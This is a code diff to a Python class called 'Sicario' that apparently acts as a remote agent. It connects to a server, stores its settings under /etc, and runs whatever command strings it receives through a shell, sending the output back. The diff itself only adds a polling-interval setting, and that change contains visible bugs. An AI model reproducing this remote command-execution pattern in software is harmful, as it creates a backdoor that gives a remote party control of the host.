@@ -6,6 +6,7 @@ class Sicario:
 	host = '127.0.0.1'
 	port = 1488
 	key = ''
+	interval = 60
 	socket = False
 	listen = True
 
@@ -15,6 +16,8 @@ class Sicario:
 		self.port = config[1] 
 		if len(config) > 2:
 			self.key = config[2]
+		if len(config) > 3:
+			self.interval = config[3]
 
 		self.start()
 
@@ -34,7 +37,7 @@ class Sicario:
 			self.__send('register')
 			key = self.__parse_command(self.__receive())[2]
 			with open('/etc/sicario/sicario.conf', 'w') as f:
-				f.write('{},{},{}'.format(self.host, self.port, key))
+				f.write('{},{},{}'.format(self.host, self.port, key, self.interval))
 				f.close()
 		else:
 			self.__send(self.__build_command(['login', self.key]))
@@ -58,6 +61,14 @@ class Sicario:
 
 		if command[0] == 'execute':
 			self.__send(subprocess.check_output(' '.join(command[1:]), shell=True))
+		elif command [0] == 'set':
+			if command[1] == 'interval':
+				self.daemon.interval = command[2]
+				self.__send('ok')
+				with open('/etc/sicario/sicario.conf', 'w') as f:
+					f.write('{},{},{},{}'.format(self.host, self.port, self.key, command[2]))
+					f.close()
+
 
 	def __send (self, data):
 		if not self.socket:
